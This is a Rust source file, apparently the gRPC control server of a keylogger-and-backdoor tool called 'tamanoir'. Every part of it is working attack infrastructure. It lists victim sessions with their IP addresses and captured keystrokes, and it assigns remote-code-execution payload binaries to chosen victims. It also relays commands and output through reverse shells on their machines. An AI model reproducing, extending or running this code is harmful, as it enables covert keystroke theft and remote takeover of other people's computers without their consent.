use std::{net::Ipv4Addr, pin::Pin, str::FromStr};

use home::home_dir;
use log::{debug, info};
use tamanoir_common::Layout;
use tokio::fs;
use tokio_stream::Stream;
use tonic::{transport::Server, Code, Request, Response, Status};

use crate::{
    tamanoir_grpc::{
        rce_server::{Rce, RceServer},
        remote_shell_server::{RemoteShell, RemoteShellServer},
        session_server::{Session, SessionServer},
        AvailableRceResponse, Empty, ListSessionsResponse, SessionRcePayload, SessionRequest,
        SessionResponse, SetSessionLayoutRequest, SetSessionRceRequest, ShellStd,
    },
    tcp_shell::TcpShell,
    SessionsStore, TargetArch,
};

pub async fn serve_tonic(
    grpc_port: u16,
    sessions_store: SessionsStore,
    remote_shell: TcpShell,
) -> anyhow::Result<()> {
    let addr = format!("0.0.0.0:{}", grpc_port).parse().unwrap();
    info!("Starting grpc server");
    debug!("Grpc server is listening on {}", addr);
    Server::builder()
        .add_service(SessionServer::new(sessions_store.clone()))
        .add_service(RceServer::new(sessions_store))
        .add_service(RemoteShellServer::new(remote_shell))
        .serve(addr)
        .await?;
    Ok(())
}

#[tonic::async_trait]
impl Session for SessionsStore {
    async fn list_sessions(
        &self,
        request: Request<Empty>,
    ) -> Result<Response<ListSessionsResponse>, Status> {
        debug!(
            "<GetSessions> Got a request from {:?}",
            request.remote_addr()
        );
        let current_sessions = self.sessions.lock().await;

        let mut sessions: Vec<SessionResponse> = vec![];
        for s in current_sessions.values().into_iter() {
            let rce_payload: Option<SessionRcePayload> = match &s.rce_payload {
                Some(payload) => Some(SessionRcePayload {
                    name: payload.name.clone(),
                    target_arch: payload.target_arch.to_string(),
                    length: payload.length as u32,
                    buffer_length: payload.buffer.len() as u32,
                }),
                _ => None,
            };
            let session_ip = s.ip.to_string();
            sessions.push(SessionResponse {
                ip: session_ip.clone(),
                key_codes: s.key_codes.iter().map(|byte| *byte as u32).collect(),
                rce_payload: rce_payload,
                first_packet: s.first_packet.format("%Y-%m-%d %H:%M:%S utc").to_string(),
                latest_packet: s.latest_packet.format("%Y-%m-%d %H:%M:%S utc").to_string(),
                n_packets: s.n_packets as u32,
                keyboard_layout: s.keyboard_layout as u32,
                arch: s.arch.clone() as u32,
                shell_availability: s.shell_availability,
            })
        }

        let reply = ListSessionsResponse { sessions };
        Ok(Response::new(reply))
    }

    type WatchSessionsStream =
        Pin<Box<dyn Stream<Item = Result<SessionResponse, Status>> + Send + 'static>>;

    async fn watch_sessions(
        &self,
        _request: Request<Empty>,
    ) -> Result<Response<Self::WatchSessionsStream>, Status> {
        let mut rx = self.tx.subscribe();

        let stream = async_stream::try_stream! {
        while let Ok(session) = rx.recv().await {

                let rce_payload:Option<SessionRcePayload> = match session.rce_payload   {
                    Some(payload) => Some(SessionRcePayload {name:payload.name,target_arch:payload.target_arch.to_string(),length:payload.length as u32,buffer_length:payload.buffer.len() as u32}),
                    _ => None,
                };
                let session_ip=session.ip.clone().to_string();
                yield SessionResponse {
                    ip: session_ip,
                    key_codes: session.key_codes.iter().map(|byte| *byte as u32).collect(),
                    rce_payload: rce_payload,
                    first_packet:  session.first_packet.format("%Y-%m-%d %H:%M:%S utc").to_string(),
                    latest_packet: session.latest_packet.format("%Y-%m-%d %H:%M:%S utc").to_string(),
                    n_packets:session.n_packets as u32,
                    keyboard_layout: session.keyboard_layout as u32,
                    arch: session.arch.clone() as u32,
                    shell_availability:session.shell_availability
                };


        }
        };
        Ok(Response::new(Box::pin(stream) as Self::WatchSessionsStream))
    }
    async fn set_session_layout(
        &self,
        request: Request<SetSessionLayoutRequest>,
    ) -> Result<Response<Empty>, Status> {
        debug!(
            "<SetSessionLayout> Got a request from {:?}",
            request.remote_addr()
        );
        let req = request.into_inner();
        let ip = Ipv4Addr::from_str(&req.ip)
            .map_err(|_| Status::new(Code::InvalidArgument, format!("{}: invalid ip", req.ip)))?;
        let layout = Layout::from(req.layout as u8);
        let mut current_sessions = self.sessions.lock().await;
        match current_sessions.get_mut(&ip) {
            Some(existing_session) => {
                existing_session.set_layout(layout);
                self.try_send(existing_session.clone())
                    .map_err(|e| Status::new(Code::Internal, format!("{}", e)))?;

                Ok(Response::new(Empty {}))
            }
            None => Err(Status::new(
                Code::NotFound,
                format!("{}: session not found", ip),
            )),
        }
    }
}

fn extract_rce_metadata(path: String) -> Option<(String, TargetArch)> {
    let p: Vec<&str> = path.split("/").collect();
    let p = p[p.len() - 1];
    let trimmed: String = p.replace("tamanoir-rce-", "").replace(".bin", "");
    let split: Vec<&str> = trimmed.split("_").collect();
    if split.len() < 2 {
        return None;
    }
    let name = split[0];
    let arch = split[1..].join("_");
    if let Ok(arch) = TargetArch::from_str(&arch) {
        return Some((name.into(), arch));
    }
    None
}

#[tonic::async_trait]
impl Rce for SessionsStore {
    async fn delete_session_rce(
        &self,
        request: Request<SessionRequest>,
    ) -> Result<Response<Empty>, Status> {
        debug!(
            "<DeleteSessionRce> Got a request from {:?}",
            request.remote_addr()
        );
        let req = request.into_inner();
        let ip = Ipv4Addr::from_str(&req.ip)
            .map_err(|_| Status::new(Code::NotFound, format!("{}: invalid ip", req.ip)))?;

        let mut current_sessions = self.sessions.lock().await;

        match current_sessions.get_mut(&ip) {
            Some(existing_session) => {
                existing_session.reset_rce_payload();
                self.try_send(existing_session.clone())
                    .map_err(|e| Status::new(Code::Internal, format!("{}", e)))?;

                Ok(Response::new(Empty {}))
            }
            None => Err(Status::new(
                Code::NotFound,
                format!("{}: session not found", ip),
            )),
        }
    }
    async fn list_available_rce(
        &self,
        _request: Request<Empty>,
    ) -> Result<Response<AvailableRceResponse>, Status> {
        let mut build_dir = home_dir().unwrap();
        build_dir.push(".tamanoir/bins");
        let mut rce_list: Vec<SessionRcePayload> = vec![];
        if build_dir.exists() {
            let mut read_dir = fs::read_dir(build_dir).await?;
            while let Some(entry) = read_dir.next_entry().await? {
                let path = format!("{}", entry.path().display());
                if let Some((name, arch)) = extract_rce_metadata(path) {
                    rce_list.push(SessionRcePayload {
                        name: name,
                        target_arch: arch.to_string(),
                        buffer_length: 0,
                        length: 0,
                    })
                }
            }
        }
        Ok(Response::new(AvailableRceResponse { rce_list }))
    }
    async fn set_session_rce(
        &self,
        request: Request<SetSessionRceRequest>,
    ) -> Result<Response<Empty>, Status> {
        debug!(
            "<SetSessionRce> Got a request from {:?}",
            request.remote_addr()
        );
        let req = request.into_inner();
        let ip = Ipv4Addr::from_str(&req.ip)
            .map_err(|_| Status::new(Code::InvalidArgument, format!("{}: invalid ip", req.ip)))?;

        let mut current_sessions = self.sessions.lock().await;
        let target_arch = TargetArch::from_str(&req.target_arch).map_err(|_| {
            Status::new(
                Code::InvalidArgument,
                format!("{}: unknown target arch", req.target_arch),
            )
        })?;
        match current_sessions.get_mut(&ip) {
            Some(existing_session) => {
                match existing_session.set_rce_payload(&req.rce, target_arch) {
                    Ok(_) => {
                        self.try_send(existing_session.clone())
                            .map_err(|e| Status::new(Code::Internal, format!("{}", e)))?;
                        Ok(Response::new(Empty {}))
                    }
                    Err(e) => Err(Status::new(
                        Code::InvalidArgument,
                        format!("{}: invalid rce ({})", req.rce, e),
                    )),
                }
            }
            None => Err(Status::new(
                Code::NotFound,
                format!("{}: session not found", ip),
            )),
        }
    }
}

#[tonic::async_trait]
impl RemoteShell for TcpShell {
    type WatchShellStdOutStream =
        Pin<Box<dyn Stream<Item = Result<ShellStd, Status>> + Send + 'static>>;

    async fn watch_shell_std_out(
        &self,
        _request: Request<Empty>,
    ) -> Result<Response<Self::WatchShellStdOutStream>, Status> {
        let mut rx = self.stdout_broadcast_tx.subscribe();

        let stream = async_stream::try_stream! {
        while let Ok(msg) = rx.recv().await {
                yield msg;
        }
        };
        Ok(Response::new(
            Box::pin(stream) as Self::WatchShellStdOutStream
        ))
    }
    async fn send_shell_std_in(
        &self,
        request: Request<ShellStd>,
    ) -> Result<Response<Empty>, Status> {
        debug!(
            "<SendShellStdIn> Got a request from {:?}",
            request.remote_addr()
        );
        let req = request.into_inner();

        let rxtx = self.get_rx_tx(req.ip.clone()).map_err(|_| {
            Status::new(
                Code::NotFound,
                format!("{}: socket not found", req.ip.clone()),
            )
        })?;
        rxtx.stdin_tx.send(req.clone()).await.map_err(|_| {
            Status::new(
                Code::Internal,
                format!("{}: couldn't write to socket", req.ip),
            )
        })?;
        return Ok(Response::new(Empty {}));
    }

    async fn shell_close(
        &self,
        request: Request<SessionRequest>,
    ) -> Result<Response<Empty>, Status> {
        debug!(
            "<ShellClose> Got a request from {:?}",
            request.remote_addr()
        );
        let req = request.into_inner();
        match self.get_rx_tx(req.ip.clone()) {
            Ok(_) => {
                self.rx_tx_map.write().unwrap().remove(&req.ip.clone());
                let mut current_sessions = self.session_store.sessions.lock().await;
                let current_session = current_sessions
                    .get_mut(&Ipv4Addr::from_str(&req.ip.clone()).unwrap())
                    .unwrap();
                current_session.set_shell_availibility(false);
            }
            _ => {}
        }
        Ok(Response::new(Empty {}))
    }
}
